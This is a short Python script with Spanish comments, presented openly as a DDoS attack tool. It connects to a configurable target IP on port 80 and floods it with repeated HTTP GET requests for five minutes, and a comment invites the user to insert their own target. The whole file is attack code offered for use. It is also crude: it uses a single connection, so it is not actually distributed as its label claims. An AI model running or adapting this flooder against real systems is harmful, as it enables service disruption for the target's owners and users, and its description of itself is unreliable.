import socket
import random
import time

# Configuración de la dirección IP y puerto del objetivo
target_ip = "10.10.10.250"  # Aquí debes colocar la dirección IP de tu objetivo
target_port = 80  # Puerto que deseas atacar (por ejemplo, el puerto HTTP)

# Configuración del tiempo de duración del ataque y la tasa de solicitud por segundo
duration = 300  # Duración del ataque en segundos
requests_per_second = 100  # Número de solicitudes por segundo

# Crear un socket TCP
tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Ejecutar el ataque durante el tiempo especificado
print("Iniciando ataque DDoS...")
start_time = time.time()
tcp_socket.connect((target_ip, target_port))  # Conectar al objetivo
while time.time() - start_time < duration:
    for i in range(requests_per_second):
        tcp_socket.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")  # Envía un paquete TCP
        print(f"Solicitud enviada ({i+1}/{requests_per_second})")
    time.sleep(1)

# Cerrar el socket después de terminar el ataque
tcp_socket.close()
print("Ataque DDoS completado.")
